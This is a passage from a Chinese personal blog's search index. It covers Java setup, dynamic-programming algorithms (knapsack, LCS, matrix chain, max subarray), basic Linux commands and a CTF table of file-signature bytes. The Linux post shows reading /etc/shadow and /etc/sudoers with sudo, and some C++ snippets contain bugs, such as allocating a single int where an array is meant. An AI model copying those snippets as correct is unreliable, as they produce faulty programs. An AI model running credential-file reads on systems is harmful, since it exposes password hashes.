for(int k=0;k&lt;arr.length;k++) &#123; System.out.println(arr[k]); //像c++的数组，每输出一个元素都换行println &#125; for(int k=0;k&lt;arr.length;k++) &#123; System.out.print(arr[k]+&quot;,&quot;); //在一行输出，不换行 &#125; System.out.print(&quot;\\n&quot;); //换行 for(int x:arr)&#123; //把数组元素给x，然后输出 System.out.print( x ); System.out.print(&quot;,&quot;); &#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"JAVA环境","slug":"编程/JAVA学习","date":"2018-11-13T08:45:51.000Z","updated":"2021-05-23T07:30:58.180Z","comments":true,"path":"2018/11/13/编程/JAVA学习/","link":"","permalink":"http://example.com/2018/11/13/%E7%BC%96%E7%A8%8B/JAVA%E5%AD%A6%E4%B9%A0/","excerpt":"今天开始学java了，记录一波。","text":"今天开始学java了，记录一波。 JDK安装 下载网址：https://www.oracle.com/technetwork/java/javase/downloads/index.html 按步骤安装即可。 配置环境变量1、右键点击“计算机”，点击属性。然后点击左侧“高级系统设置”。 2、点击环境变量，如下图。 3、添加系统变量，点击新建，信件内容如下： 变量名：JAVA_HOME 值：jdk的安装路径，如：C:\\java\\jdk.8.121 变量名：CLASSPATH 值：.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar 4、点击“Path”，进行编辑。 在最后添加“;%JAVA_HOME%\\bin;JAVA_HOME%\\jre\\bin”，如下图： 5、测试。打开cmd，输入java -version和javac，显示如下，即安装配置成功 Eclipse安装安装 下载地址：https://www.eclipse.org/downloads/ 下载完后，安装即可。 使用 依次单击“file”–&gt;”new”–&gt;”java object”. 然后，右键依次点击“src”–&gt;”new”–&gt;”class”","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"JAVA环境","slug":"编程/java环境配置","date":"2018-11-13T08:45:51.000Z","updated":"2021-05-23T07:30:53.296Z","comments":true,"path":"2018/11/13/编程/java环境配置/","link":"","permalink":"http://example.com/2018/11/13/%E7%BC%96%E7%A8%8B/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","excerpt":"今天开始学java了，记录一波。","text":"今天开始学java了，记录一波。 JDK安装 下载网址：https://www.oracle.com/technetwork/java/javase/downloads/index.html 按步骤安装即可。 配置环境变量1、右键点击“计算机”，点击属性。然后点击左侧“高级系统设置”。 2、点击环境变量，如下图。 3、添加系统变量，点击新建，信件内容如下： 变量名：JAVA_HOME 值：jdk的安装路径，如：C:\\java\\jdk.8.121 变量名：CLASSPATH 值：.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar 4、点击“Path”，进行编辑。 在最后添加“;%JAVA_HOME%\\bin;JAVA_HOME%\\jre\\bin”，如下图： 5、测试。打开cmd，输入java -version和javac，显示如下，即安装配置成功 Eclipse安装安装 下载地址：https://www.eclipse.org/downloads/ 下载完后，安装即可。 使用 依次单击“file”–&gt;”new”–&gt;”java Project”，填入Project name,点击finish,如下： 然后，右键依次点击左侧“src”–&gt;”new”–&gt;”class”，填入name即可。","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"0--1背包和完全背包","slug":"编程/0-1背包和完全背包","date":"2018-11-10T14:15:41.000Z","updated":"2021-05-23T07:33:50.935Z","comments":true,"path":"2018/11/10/编程/0-1背包和完全背包/","link":"","permalink":"http://example.com/2018/11/10/%E7%BC%96%E7%A8%8B/0-1%E8%83%8C%E5%8C%85%E5%92%8C%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85/","excerpt":"0-1背包与完全背包的不同","text":"0-1背包与完全背包的不同本文转自CSDN，原文：https://blog.csdn.net/qiaoruozhuo/article/details/76167137 分析：0-1背包和完全背包问题的区别在于前者同一种物品最多选一次，而后者同一种物品可多次选取。我们使用B[i][j]表示从前i件物品中选出若干件物品放在容量为j的背包中，所得的最大价值，可以得到二者的状态方程分别为： 0-1背包问题：B[i][j] = B[i-1][j]，其中j &lt; W[i]；或者B[i][j] = max(B[i-1][j], B[i-1][j-W[i]] + P[i])，其中j &gt;= W[i]。 完全背包问题：B[i][j] = B[i-1][j]，其中j &lt; W[i]；或者B[i][j] = max(B[i-1][j], B[i][j-W[i]] + P[i])，其中j &gt;= W[i]。 二者状态方程的区别在于： 0-1背包问题中，若取了1件第i个物品，则总容量变为j-W[i]，剩下的只能在前i-1件物品中去取了，其最大总价值为B[i-1][j-W[i]] + P[i]； 完全背包问题中，若取了1件第i个物品，则总容量变为j-W[i]，剩下的仍可以在前i件物品中去取，其最大总价值为B[i][j-W[i]] + P[i]； 一维数组优化算法:0-1背包问题：B[i][j] = max(B[i-1][j], B[i-1][j-W[i]] + P[i])，即第i行第j列的元素，由第i-1行的元素决定，且列坐标j大的元素由j小的元素决定，若我们用一维数组F[j]代替B[i][j]，则只记录了列坐标，未记录行坐标，在同一行中，必须先求出列坐标较大的元素，再求列坐标小的元素，这样先改变的是下标j较大的元素，且其不会影响j小的元素。故在内层循环中，应该让循环变量j的值从大到小递减。 完全背包问题：B[i][j] = max(B[i-1][j], B[i][j-W[i]] + P[i])，即第i行第j列的元素，可能是等于第i-1行第j列的元素，也可能由第i行第j-W[i]列的元素决定，故必须先求出同一行中列坐标j较小的元素，用来计算j较大的元素。 若我们用一维数组F[j]代替B[i][j]，则只记录了列坐标，未记录行坐标，在同一行中，必须先求出列坐标j较小的元素，再求j大的元素，故在内层循环中，应该让循环变量j的值从小到大递增（与0-1背包问题刚好相反）。 总结：二者的状态方程很相似，区别在于B[i][j]是由上一行的较小列坐标决定，还是由同一行的较小列坐标决定，使用二维数组记录最优解时，我们可以直接根据状态方程求B[i][j]，因为同时记录了元素的行坐标和列坐标值，故无论内层循环的循环变量j是递增还是递减，都不影响计算结果。但是，若使用一维数组F[j]代替B[i][j]，则只记录了列坐标，未记录行坐标，需要考虑先改变列坐标j较大的元素还是j较小的元素。在0-1背包问题中，须先求出列坐标j较大的元素，故让循环变量j的值从大到小递减；而完全背包问题中，须先求出列坐标j较小的元素，故让循环变量j的值从小到大递增。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include&lt;iostream&gt;#include&lt;cmath&gt;using namespace std;const int MAXC = 12880; //背包最大容量 const int MAXN = 3402; //物品的个数int W[MAXN+1];//物品的重量 int P[MAXN+1];//物品的价值 int F1[MAXC+1]; //记录装入容量为c的背包的最大价值int B1[MAXN+1][MAXC+1]; //备忘录，记录给定n个物品装入容量为c的背包的最大价值 int F2[MAXC+1]; //记录装入容量为c的背包的最大价值int B2[MAXN+1][MAXC+1]; //备忘录，记录给定n个物品装入容量为c的背包的最大价值 int Best_1(int n, int c); //0-1背包问题：二维数组记录最优解 int Best_2(int n, int c);//0-1背包问题：一维数组记录最优解int Best_3(int n, int c);//完全背包问题：二维数组记录最优解int Best_4(int n, int c);//完全背包问题：一维数组记录最优解 int main() &#123; int n, c; cin &gt;&gt; n &gt;&gt; c; for (int i=1; i&lt;=n; i++)//不计下标为0的元素 &#123; cin &gt;&gt; W[i] &gt;&gt; P[i]; &#125; cout &lt;&lt; Best_1(n, c) &lt;&lt; endl; cout &lt;&lt; Best_2(n, c) &lt;&lt; endl; cout &lt;&lt; Best_3(n, c) &lt;&lt; endl; cout &lt;&lt; Best_4(n, c) &lt;&lt; endl; return 0;&#125; int Best_1(int n, int c)//0-1背包问题：二维数组记录最优解 &#123; //记录前i(1&lt;=i&lt;n)个物品装入容量为0-c的背包的最大价值 for (int i=1; i&lt;n; i++) &#123; for (int j=0; j&lt;W[i]; j++)//背包容量不够，不能装下第i件物品 &#123; B1[i][j] = B1[i-1][j]; &#125; for (int j=W[i]; j&lt;=c; j++)//背包容量足够，可以选择装或不装第i件物品 &#123; if (B1[i-1][j] &lt; B1[i-1][j-W[i]] + P[i]) B1[i][j] = B1[i-1][j-W[i]] + P[i]; &#125; &#125; //因为第n个物品最多装一次，故只要容量够，未装满与装满的价值是一样的，即B1[n][c]==B1[n][j]，其中W[n]&lt;=j&lt;=c //所以对第n个物品来说，只需考虑容量恰好为c的情况，这样可以减少计算量 if (c &lt; W[n]) //如果容量不够 &#123; B1[n][c] = B1[n-1][c]; //先默认为不装第n个物品 &#125; else &#123; B1[n][c] = max(B1[n-1][c], B1[n-1][c-W[n]]+P[n]); &#125; return B1[n][c];&#125; int Best_2(int n, int c)//0-1背包问题：一维数组记录最优解&#123; //为简化代码，没有把i==n的情形单独拿出来处理，若需要单独处理第n个物品，可参考Best_1() for (int i=1; i&lt;=n; i++) &#123;//须先求出列坐标j较大的元素，故让循环变量j的值从大到小递减 for (int j=c; j&gt;=W[i]; j--) &#123;//当(j &lt; W[i] || F1[j] &gt; F1[j-W[i]] + P[i])时，F1[j]的值不变 if (F1[j] &lt; F1[j-W[i]] + P[i]) F1[j] = F1[j-W[i]] + P[i]; &#125; &#125; return F1[c];&#125; int Best_3(int n, int c)//完全背包问题：二维数组记录最优解&#123; for (int i=1; i&lt;=n; i++) &#123; for (int j=1; j&lt;W[i]; j++)//容量不够，则和给定i-1个物品装入容量为j的背包的结果一致 &#123; B2[i][j] = B2[i-1][j]; &#125; for (int j=W[i]; j&lt;=c; j++) &#123;//B2[i][j-W[i]]表示给定i个物品装入容量为j-W[i]的背包，质量为W[i]的物品可能装了多个 B2[i][j] = max(B2[i-1][j], B2[i][j-W[i]] + P[i]); &#125; &#125; return B2[n][c];&#125; int Best_4(int n, int c)//完全背包问题：一维数组记录最优解&#123; for (int i=1; i&lt;=n; i++) &#123;//须先求出列坐标j较小的元素，故让循环变量j的值从小到大递增 for (int j=W[i]; j&lt;=c; j++) &#123;//当(j &lt; W[i] || F2[j] &gt; F2[j-W[i]] + P[i])时，F2[j]的值不变 if (F2[j] &lt; F2[j-W[i]] + P[i]) F2[j] = F2[j-W[i]] + P[i]; &#125; &#125; return F2[c];&#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"最大子段和","slug":"编程/最大子段和","date":"2018-11-06T14:16:29.000Z","updated":"2021-05-23T07:32:00.525Z","comments":true,"path":"2018/11/06/编程/最大子段和/","link":"","permalink":"http://example.com/2018/11/06/%E7%BC%96%E7%A8%8B/%E6%9C%80%E5%A4%A7%E5%AD%90%E6%AE%B5%E5%92%8C/","excerpt":"给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。","text":"给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。 动态规划方程b[j]=max(b[j-1]+a[j],a[j]) 1&lt;=j&lt;=n 最大子段和核心算法1234567891011int maxsum(int *a,int n)&#123; int b=0,sum=0; for(int i=1;i&lt;=n;i++) &#123; if(b&gt;0)b+=a[i]; else b=a[i]; if(b&gt;sum)sum=b; &#125; return sum;&#125; 全部代码12345678910111213141516171819202122232425262728293031#include&lt;iostream&gt;using namespace std;int Maxsum(int n,int *a)&#123; int sum=0,b=0; for(int i=1;i&lt;=n;i++) &#123; if(b&gt;0)b+=a[i]; else b=a[i]; if(b&gt;sum)sum=b; &#125; return sum; &#125; int main()&#123; int m; cin&gt;&gt;m; for(int t=0;t&lt;m;t++) &#123; int *n=new int(m); for(int j=0;j&lt;m;j++) &#123; cin&gt;&gt;n[j]; int *p=new int(n[j]); for(int i=1;i&lt;=n[j];i++) cin&gt;&gt;p[i]; int t=Maxsum(n[j],p); cout&lt;&lt;t&lt;&lt;endl; &#125; &#125;&#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"最长公共子序列","slug":"编程/最长公共子序列","date":"2018-11-06T14:04:07.000Z","updated":"2021-05-23T07:32:04.914Z","comments":true,"path":"2018/11/06/编程/最长公共子序列/","link":"","permalink":"http://example.com/2018/11/06/%E7%BC%96%E7%A8%8B/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%AD%90%E5%BA%8F%E5%88%97/","excerpt":"求解两个字符串的最长公共子序列","text":"求解两个字符串的最长公共子序列 题目描述 最长公共子序列最优解(最大长度)1234567891011121314151617181920212223242526void LCSlength(int m,int n,char *x,char *y,int **c,int **b)&#123; int i,j; for(i=1;i&lt;=m;i++)c[i][0]=0; for(i=1;i&lt;=n;i++)c[0][i]=0; //i=0或者j=0,最长公共子序列为空 for(i=1;i&lt;=m;i++) for(j=1;j&lt;=n;j++) &#123; if(x[i]==y[j]) //x[i]=y[j]时,c[i][j]=斜上方的c[i-1][j-1]+1 &#123; c[i][j]=c[i-1][j-1]+1; b[i][j]=1; //b[i][j]=1;表示c[i][j]来自斜上方的值+1而来 &#125; //下面 max(c[i-1][j],c[][j-1]) else if(c[i-1][j]&gt;c[i][j-1]) &#123; c[i][j]=c[i-1][j]; b[i][j]=2; //b[i][j]=2;表示c[i][j]来自正上方的值+1而来 &#125; else &#123; c[i][j]=c[i][j-1]; b[i][j]=3; //b[i][j]=3;表示c[i][j]来自左方的值+1而来 &#125; &#125;&#125; 最优解的序列12345678910111213void LCS(int i,int j,char *x,char **b)&#123; if(i==0||j==0)return; if(b[i][j]==1) &#123; LCS(i-1,j-1,x,b); cout&lt;&lt;x[i]; &#125; else if(b[i][j]==2) LCS(i-1,j,x,b); else LCS(i,j-1,x,b);&#125; 完整代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include&lt;iostream&gt;using namespace std;int c[2000][2000];char x[2000],y[2000];/*最优解，输出公共序列void LCS(int i,int j)&#123; if(i==0||j==0)return; if(b[i][j]==1) &#123; LCS(i-1,j-1,x,b); cout&lt;&lt;x[i-1]; &#125; else if(b[i][j]==2) LCS(i-1,j); else LCS(i,j-1);&#125;*/int LCSLength(int m,int n)&#123; int i, j; int len; for (i = 1; i &lt;= m; i++) c[i][0] = 0; for (i = 1; i&lt;=n; i++) c[0][i] = 0; for (i = 1; i &lt;= m; i++) &#123; for (j = 1; j &lt;= n; j++) &#123; if (x[i-1]==y[j-1]) &#123; c[i][j] = c[i - 1][j - 1] + 1; &#125; else if (c[i - 1][j] &gt;=c[i][j - 1]) &#123; c[i][j] = c[i - 1][j]; &#125; else &#123; c[i][j] = c[i][j - 1]; &#125; &#125; &#125; len = c[m][n]; return len;&#125;int main(void)&#123; int m,n, len; while(cin &gt;&gt; x)&#123; cin &gt;&gt; y; m= strlen(x); n= strlen(y); len = LCSLength(m,n); cout &lt;&lt; len &lt;&lt; endl; &#125;&#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"0-1背包","slug":"编程/0-1背包","date":"2018-11-06T13:03:10.000Z","updated":"2021-05-23T07:33:53.099Z","comments":true,"path":"2018/11/06/编程/0-1背包/","link":"","permalink":"http://example.com/2018/11/06/%E7%BC%96%E7%A8%8B/0-1%E8%83%8C%E5%8C%85/","excerpt":"关于0-1背包的两种解法","text":"关于0-1背包的两种解法 题目描述背包容量c=10 物品数量n=5 输入五个物品的重量w[i]和价值v[i] 求最大价值。 二维数组存储最优解代码如下 1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int m[1000][1000];void knapsack(int *v,int *w,int n,int c)&#123; int jmax=min(w[n]-1,c); for(int j=0;j&lt;=jmax;j++)m[n][j]=0; for(int j=w[n];j&lt;=c;j++)m[n][j]=v[n]; for(int i=n-1;i&gt;1;i--) &#123; int jmax=min(w[i]-1,c); for(int j=0;j&lt;=jmax;j++) m[i][j]=m[i+1][j]; for(int j=w[i];j&lt;=c;j++) m[i][j]=max(m[i+1][j],m[i+1][j-w[i]]+v[i]); &#125; m[1][c]=m[2][c]; if(c&gt;=w[1])m[1][c]=max(m[1][c],m[2][c-w[1]]+v[1]);&#125;int main()&#123; int c=10; //背包容量 int n=5; //物品数目 int v[10]=&#123;0&#125;,w[10]=&#123;0&#125;;//v[]价值，w[]重量 for(int i=1;i&lt;=n;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; knapsack(v,w,n,c); cout&lt;&lt;m[1][c];&#125; 一维数组存储最优解代码如下： 123456789101112131415161718#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int m[1000];int main()&#123; int c=10; int n=5; int v[10]=&#123;0&#125;,w[10]=&#123;0&#125;; for(int i=1;i&lt;=n;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; for(int i=1;i&lt;=n;i++) for(int j=c;j&gt;=w[i];j--) m[j]=max(m[j],m[j-w[i]]+v[i]); cout&lt;&lt;m[c];&#125; 这是构造最优解的算法 ,即放入哪些物品。123456789101112void traceback(int **m,int *w,int c,int n,int *x)&#123; for(int i=1;i&lt;n;i++) //1--放入 0--不放入 if(m[i][c]==m[i+1][c]) x[i]=0; else &#123; x[i]=1; c-=w[i]; &#125; x[n]=(m[n][c])?1:c;&#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"矩阵连乘","slug":"编程/矩阵连乘","date":"2018-11-02T07:28:05.000Z","updated":"2021-05-23T07:31:42.582Z","comments":true,"path":"2018/11/02/编程/矩阵连乘/","link":"","permalink":"http://example.com/2018/11/02/%E7%BC%96%E7%A8%8B/%E7%9F%A9%E9%98%B5%E8%BF%9E%E4%B9%98/","excerpt":"算法是一门让我很头疼的课程，因为平时也不怎么写代码，现在学了算法了，来总结一下一些基本算法。","text":"算法是一门让我很头疼的课程，因为平时也不怎么写代码，现在学了算法了，来总结一下一些基本算法。 矩阵连乘最优值(最少数乘次数)1234567891011121314151617181920212223void matrixchain(int *p,int n,int **m,int **s)&#123; for(int i=1;i&lt;=n;i++)m[i][i]=0; for(int r=2;r&lt;=n;r++) for(int i=1;i&lt;=n-r+1;i++) //行 &#123; int j=i+r-1; //列 m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j];//在i处断开, //m[i][j]=m[i][i]+m[i+1][j]+p[i-1]*p[i]*p[j], //而m[i][i]=0,所以m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j] s[i][j]=i; //i处断开 for(int k=i+1;k&lt;j;k++) &#123; int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; //k=i+1,表示从i以后的点处断开 if(t&lt;m[i][j]) &#123; m[i][j]=t; s[i][j]=k; &#125; &#125; &#125; &#125; 输出最优解12345678void trackback(int i,int j,int **s)&#123; if(i==j)return; trackback(i,s[i][j],s); trackback(s[i][j]+1,j,s); cout&lt;&lt;&quot;Mulitiply A&quot;&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;s[i][j]; cout&lt;&lt;&quot;and A&quot;&lt;&lt;(s[i][j]+1)&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl; &#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"Linux命令简介","slug":"编程/Linux命令简介","date":"2018-10-29T13:51:19.000Z","updated":"2021-05-23T07:31:01.698Z","comments":true,"path":"2018/10/29/编程/Linux命令简介/","link":"","permalink":"http://example.com/2018/10/29/%E7%BC%96%E7%A8%8B/Linux%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B/","excerpt":"这些是我自己在学习过程中，遇到的一些常用到的命令。","text":"这些是我自己在学习过程中，遇到的一些常用到的命令。有些可能不太正确，多多见谅。 linux简介在linux中任何内容都是文件 硬件设备文件名 /dev/… 第一个’/‘代表的是根目录，dev目录下保存的都是硬件设备文件名 根目录下的bin和sbin，usr目录下的bin和sbin这四个目录都是用来保存系统命令的 /etc/ 目录下一般都是配置文件 /lib/ 目录下一般都是Linux的函数库 proc和sys 目录不应该 操作，这两个目录保存的是内存的过载点 所以不应该在Linux下任何一个文件夹内乱写东西，可以在家目录root或home，以及temp目录下随便放内容 uname -a ： 查看系统信息 直接输入某应用程序的名字会将其打开，如root@root1-virtual-machine:# firefox，可以用root@root1-virtual-machine:# firefox &amp; 使其在后台打开 root@root1-virtual-machine:~# firefox www.baidu.com 则会打开百度 文件和目录的管理打开文件夹的方法使用：cd 目录 —–进入某目录，cd ..进入上级目录，cd / 进入根目录，ll —-查看文件夹里的文件pwd 显示当前目录 打开文件的方法： 编辑文件用 vi 文件名 或者 vim 文件名。 vi是Linux终端下或控制台下常用的编辑器， 基本的操作方式为：vi /路径/文件名 例如，vi /etc/fstab表示显示/etc/fstab文件的内容。使用键盘上的Page Up和Page Down键可以上下翻页;按下Insert键，可以见到窗口左下角有“Insert”字样，表示当前为插入编辑状态，这时从键盘输入的内容将插入到光标位置;再按下Insert键，左下角将有“Replace”字样，表示当前为替换编辑状态，这时从键盘输入的内容将替换光标位置的内容。编辑完内容后，按下Esc键，并输入“:wq”，然后回车就可以保存退出。 如果不想保存而直接退出，则按下Esc键后，输入“:q!”，然后回车即可。“wq”表示Write和Quit，即保存退出;“q!”表示忽略修改强行退出。 查看文件n内容用 cat 文件名 或 less 文件名ls:查看当前目录下的目录或文件 ls -a 查看所有文件，包括隐藏文件 ls -l查看所有目录和权限等各种属性 drwxr-xr-x 2 root1 root1 4096 3月 12 23:14 Templates 查到的权限像这样， d 表示的是这是一个目录 零散的文件操作 ls &gt; currentdir 输出重定向，ls &gt; currentdir 命令 会把当前目录放到currentfir中，用cat currentdir可以查看（会覆盖一些文件，慎用ls currentdir较好） cat：查看文件内容，cat &lt;&lt; aa 输入重定向， 碰到aa会结束（aa为人已字符） cat -n 文件 显示文件行号 more： 查看文件内容，会把文件分页，方便查看，也可以cat|more less： 显示文本文件的内容 可以移动光标，在文件底部，输入q会退出 grep ：grep aa 文件 ， 在文件中查找含有aa的部分 locate ：查找系统中的一些目录或文件 locate a 查找系统中含有a的目录或文件 whereis： whereis+文件、程序、命令 查找出文件、程序、或命令的存放位置和相关信息 which： which+文件、程序、命令 查看文件、程序、命令存放在那个目录中 who： 查看哪些用户登录，以及其登陆的控制台， whoami 可以显示当前登录的用户 touch：创建一个文件 mkdir：创建一个目录 mv：移动一个文件或者目录到连一个目录下 mv -b 可以避免同名文件被覆盖，原文件后会有一个~ mv a（文件） b（文件）把a重命名为b rmdir：删除一个空目录 cp：复制一个文件到一个目录下 rm：删除文件 ，rm -i 询问是否删除，rm -r 删除任何文件或目录 ln： ln aa bb 给aa创建一个硬链接，bb是一个实实在在的文件，但如果改变aa，bb也会改变。但如果删除aa，bb还会存在。 ln -s aa bb 给aa创建一个符号链接文件bb ln -s aa/ bb 给aa目录创建一个符号链接文件bb （链接文件类似一个文件的快捷方式，不是一个真正的文件，-s就是为了指明该文件是链接文件） | : 管道符号（竖线），可以将一条命令的输出连接到另一条命令的输入 a|b a的输出作为b的输入 grep：过滤， ls | grep a 在ls输出的目录下 过滤出含有a字段的目录 权限问题 chown： 更改文件的所有权：sudo chown root1 aa drwxr-xr-x 2 root root 4096 3月 13 20:45 aa 会变成 drwxr-xr-x 2 root1 root 4096 3月 13 20:45 aa 更改目录及目录下的所有文件 sudo chown -R root1 b chmod: 改变一个文件的权限 文件属主用u表示，其他人用o表示，所有人用a表示， || r表示读，w表示写，x表示执行 chmod u+x aa 使aa文件给文件属主增加执行权限 chmod u-x aa 代表取消该权限 rwx 表示该目录对创建者来说拥有读，写和执行的权限， r-x 表示文件所有者所在组的权限读和执行 第二个r-x 表示其他人的权限 2 表示文件数目 第一个 root1 ：用户 第二个 root1： 用户组 4096 是文件大小 06-29 14:30 是创建时间 test 文件名 用户与组管理 history：可以查看 使用过的系统命令 su 命令用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号与密码。 sudo useradd 新用户名 –》增加新用户 sudo passwd 新用户名 增加密码 sudo useradd -m 新用户名 ，可以添加新用户，sudo passwd 用户名 增加 -m 参数，可以把该用户添加到主目录下，用于开机时的登录，如果不加-m，则不能登录 sudo userdel 用户名 可以删除某用户 sudo userdel -r 用户名 可以把用户机器主目录删除 sudo id 用户名 查看该用户的信息 直接输入id 可以查看目前登陆的用户信息 sudo cat /etc/sudoers 查看etc目录下的配置 sudo updatedb ： 刷新数据库 sudo chmod 600 ××× （只有所有者有读和写的权限） sudo chmod 644 ××× （所有者有读和写的权限，组用户只有读的权限） sudo chmod 700 ××× （只有所有者有读和写以及执行的权限） sudo chmod 666 ××× （每个人都有读和写的权限） sudo chmod 777 ××× （每个人都有读和写以及执行的权限） /etc/group 记录所有组的名字，及组的成员列表，sudo cat group 可以查看，sudo用来提升权限 /etc/passwd 用户的关键信息存放在 /etc/passwd文件中 系统中每一个合法用户 对应一行记录 如 root1:x:1000:1000:root1,,,:/home/root1:/bin/bash （1）root1是用户名，（2）x代表密码（口令），被保存在shadow中，（3）1000为id符号，（4）属于1000组，（5）root1，（6）用户主目录为/home/root1，（7）表明用户的登录shell 上面提到的密码（口令），可由sudo cat shadow来查看，但无法直接看到密码，MD5加密的，34个字符，标志$1$ 进程管理 ps：查看当前所有进程 psaux：显示所有进程以及与进程相关的信息 pslax：提供父进程和子进程及其优先级 top： 动态显示进程状态，按q退出 lsof+文件名：查看哪个进程在占用某文件 kill：结束某进程 ， kill+进程号about:startpage","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"hxd查看文件头,文件尾","slug":"其他/hxd查看文件头-文件尾","date":"2018-10-29T13:34:55.000Z","updated":"2019-04-12T02:36:47.714Z","comments":true,"path":"2018/10/29/其他/hxd查看文件头-文件尾/","link":"","permalink":"http://example.com/2018/10/29/%E5%85%B6%E4%BB%96/hxd%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%A4%B4-%E6%96%87%E4%BB%B6%E5%B0%BE/","excerpt":"在做题过程中发现，这个经常用，来总结一下","text":"在做题过程中发现，这个经常用，来总结一下 下面是一些 常见的JPEG (jpg)， 文件头：FFD8FF 文件尾：FF D9 PNG (png)， 文件头：89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3BZIP Archive (zip)， 文件头：504B0304 文件尾：50 4B 这些比较少见Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645TIFF (tif)， 文件头：49492A00 Windows Bitmap (bmp)， 文件头：424D HTML (html)， 文件头：68746D6C3EEmail [thorough only]， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D546864CAD (dwg)， 文件头：41433130 Adobe Photoshop (psd)， 文件头：38425053 Rich Text Format (rtf)， 文件头：7B5C727466 XML (xml)， 文件头：3C3F786D6C","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"MISC","slug":"MISC","permalink":"http://example.com/tags/MISC/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"Sec","slug":"Sec","permalink":"http://example.com/categories/Sec/"},{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"},{"name":"IoT","slug":"IoT","permalink":"http://example.com/categories/IoT/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/categories/SQL/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"http://example.com/tags/buuctf/"},{"name":"无参数RCE","slug":"无参数RCE","permalink":"http://example.com/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"},{"name":"模板注入","slug":"模板注入","permalink":"http://example.com/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"SQLi","slug":"SQLi","permalink":"http://example.com/tags/SQLi/"},{"name":"java-WEB-INF","slug":"java-WEB-INF","permalink":"http://example.com/tags/java-WEB-INF/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"PHP绕过","slug":"PHP绕过","permalink":"http://example.com/tags/PHP%E7%BB%95%E8%BF%87/"},{"name":"MYSQL比较特性","slug":"MYSQL比较特性","permalink":"http://example.com/tags/MYSQL%E6%AF%94%E8%BE%83%E7%89%B9%E6%80%A7/"},{"name":"cumtCTF","slug":"cumtCTF","permalink":"http://example.com/tags/cumtCTF/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"DVWA","slug":"DVWA","permalink":"http://example.com/tags/DVWA/"},{"name":"XSS","slug":"XSS","permalink":"http://example.com/tags/XSS/"},{"name":"Securit